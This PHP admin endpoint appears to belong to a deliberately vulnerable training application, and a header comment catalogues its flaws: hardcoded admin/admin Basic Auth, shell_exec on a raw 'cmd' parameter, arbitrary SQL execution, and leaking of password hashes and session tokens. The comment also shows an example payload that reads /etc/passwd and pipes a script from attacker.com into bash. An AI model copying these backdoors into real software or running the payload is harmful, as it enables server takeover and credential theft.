<?php
/**
 * FILE: api/internal/admin.php
 * =============================================================================
 * VULNERABILITY SUMMARY
 * =============================================================================
 *
 * [1] DEFAULT / HARDCODED CREDENTIALS (admin / admin)
 *     Type    : Authentication Failure (OWASP A07)
 *     CWE     : CWE-798 – Use of Hard-coded Credentials
 *     Detail  : The endpoint is protected only by HTTP Basic Auth with
 *               credentials hardcoded in constants.php as DEFAULT_ADMIN_USER
 *               = 'admin' and DEFAULT_ADMIN_PASS = 'admin'.  These are the
 *               most commonly tried default credentials.  Any attacker who
 *               discovers the endpoint can immediately authenticate.
 *
 * [2] REMOTE CODE EXECUTION VIA shell_exec()
 *     Type    : Injection – OS Command Injection (OWASP A03)
 *     CWE     : CWE-78 – Improper Neutralization of Special Elements in an OS Command
 *     Detail  : The 'exec' action passes the raw GET parameter ?cmd=... directly
 *               to shell_exec() with no sanitization.  An authenticated attacker
 *               (or anyone who bypasses the weak Basic Auth) can execute any
 *               operating system command as the web-server process user, leading
 *               to full server compromise.  Example:
 *               ?action=exec&cmd=id;cat /etc/passwd;curl attacker.com/shell.sh|bash
 *
 * [3] ARBITRARY SQL EXECUTION
 *     Type    : Injection (OWASP A03)
 *     CWE     : CWE-89 – Improper Neutralization of Special Elements in SQL
 *     Detail  : The 'sql' action passes the raw ?query= parameter directly to
 *               $db->query(), allowing any SQL statement to be executed:
 *               SELECT, INSERT, UPDATE, DELETE, DROP, GRANT, etc.  This is
 *               effectively an authenticated database administration backdoor.
 *
 * [4] SENSITIVE DATA DISCLOSURE IN list_users / list_sessions
 *     Type    : Broken Access Control / Information Disclosure (OWASP A01)
 *     CWE     : CWE-200 – Exposure of Sensitive Information to an Unauthorized Actor
 *     Detail  : list_users returns the raw users table including password_hash
 *               values.  list_sessions returns all active session_token and
 *               api_token values, allowing an attacker to immediately hijack any
 *               logged-in user's session without needing their password.
 *
 * [5] NO RATE LIMITING ON ADMIN ENDPOINT
 *     Type    : Security Misconfiguration (OWASP A05)
 *     CWE     : CWE-307 – Improper Restriction of Excessive Authentication Attempts
 *     Detail  : There is no lockout or throttle mechanism on Basic Auth failures,
 *               enabling unlimited brute-force attempts against the admin
 *               credentials at full network speed.
 * =============================================================================
 */
// VULN: Default credentials admin/admin
// VULN: No rate limiting on admin login
// VULN: No authentication middleware - direct access

header('Content-Type: application/json');

require_once __DIR__ . '/../../config/database.php';
require_once __DIR__ . '/../../config/constants.php';
require_once __DIR__ . '/../../includes/logger.php';

// VULN: HTTP Basic Auth with hardcoded credentials
$user = $_SERVER['PHP_AUTH_USER'] ?? '';
$pass = $_SERVER['PHP_AUTH_PW']   ?? '';

// VULN: Default admin/admin credentials, plain text comparison
if ($user !== DEFAULT_ADMIN_USER || $pass !== DEFAULT_ADMIN_PASS) {
    // VULN: Still reveals the endpoint exists
    header('WWW-Authenticate: Basic realm="Admin"');
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

$action = $_GET['action'] ?? 'list_users';

$db = getDbConnection();

switch ($action) {
    case 'list_users':
        // VULN: Returns password_hash field
        $result = $db->query("SELECT * FROM users");
        echo json_encode($result->fetchAll());
        break;

    case 'list_sessions':
        // VULN: Returns all active session tokens
        $result = $db->query("SELECT user_id, username, session_token, api_token FROM users");
        echo json_encode($result->fetchAll());
        break;

    case 'exec':
        // VULN: Remote code execution via exec action
        // VULN: User-controlled command parameter
        $cmd = $_GET['cmd'] ?? '';
        if ($cmd) {
            $output = shell_exec($cmd); // VULN: RCE
            echo json_encode(['output' => $output]);
        }
        break;

    case 'sql':
        // VULN: Arbitrary SQL execution
        $sql = $_GET['query'] ?? '';
        if ($sql) {
            $result = $db->query($sql);
            echo json_encode($result->fetchAll());
        }
        break;

    default:
        echo json_encode(['error' => 'Unknown action']);
}
